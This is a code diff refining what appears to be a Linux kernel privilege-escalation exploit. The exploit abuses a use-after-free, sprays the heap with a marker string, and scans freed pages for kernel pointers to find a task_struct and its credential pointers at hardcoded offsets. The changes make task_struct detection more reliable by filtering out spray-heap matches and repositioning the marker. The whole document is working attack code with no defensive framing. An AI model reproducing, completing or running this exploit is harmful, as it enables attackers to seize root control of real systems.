@@ -29,7 +29,6 @@
 
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
-#define OFFSET_COMM          0x818
 #define OFFSET_COMM          0x428
 #define OFFSET_CRED          0x2c0
 #define OFFSET_REAL_CRED     0x2c8
@@ -1601,7 +1600,7 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
     return 0;
 }
 
-static void analyze_uaf_page(uint8_t *data, uint64_t va) {
+static int analyze_uaf_page(uint8_t *data, uint64_t va) {
     int kptrs = 0;
     int strings = 0;
     int first_kptr_off = -1;
@@ -1628,8 +1627,10 @@ static void analyze_uaf_page(uint8_t *data, uint64_t va) {
     }
     
     if (kptrs > 0 || strings > 0) {
-        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d (first at +0x%x) | STRs:%d | Sample:\"%s\"", 
-                (unsigned long)va, kptrs, first_kptr_off, strings, found_str);
+        if (kptrs > 10 || strings > 0) {
+            fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d (first at +0x%x) | STRs:%d | Sample:\"%s\"", 
+                    (unsigned long)va, kptrs, first_kptr_off, strings, found_str);
+        }
         
         // Dump first 64 bytes if many kernel pointers are found
         if (kptrs > 40) {
@@ -1639,6 +1640,7 @@ static void analyze_uaf_page(uint8_t *data, uint64_t va) {
             }
         }
     }
+    return kptrs;
 }
 
 static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, int *num_found)
@@ -1809,6 +1811,15 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             pid_t comm_pid = -1;
             if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
             {
+                // Verify this is a task_struct and not spray_heap
+                int kptrs = analyze_uaf_page(bytes, current_va);
+                
+                if (kptrs < 10) {
+                    fprintf(stderr, "\n      [?] Found marker but K-PTRs=%d. Likely spray_heap, skipping...\n", kptrs);
+                    current_va += PAGE_SIZE * SCAN_PAGE_STEP;
+                    continue;
+                }
+
                 fprintf(stderr,
                         "\n      [!!!] FOUND KETO0422 at VA 0x%lx\n",
                         (unsigned long)current_va);
@@ -2642,7 +2653,7 @@ restart:;
             else
             {
                 memset(spray_heap, 0, PAGE_SIZE * 4);
-                snprintf((char *)spray_heap, PAGE_SIZE, "%s%05d", MARKER_NAME, self);
+                snprintf((char *)spray_heap + 0x800, PAGE_SIZE - 0x800, "%s%05d", MARKER_NAME, self);
                 for (size_t j = 0; j < PAGE_SIZE * 4; j += PAGE_SIZE)
                     ((volatile uint8_t *)spray_heap)[j] = 0x11;
             }
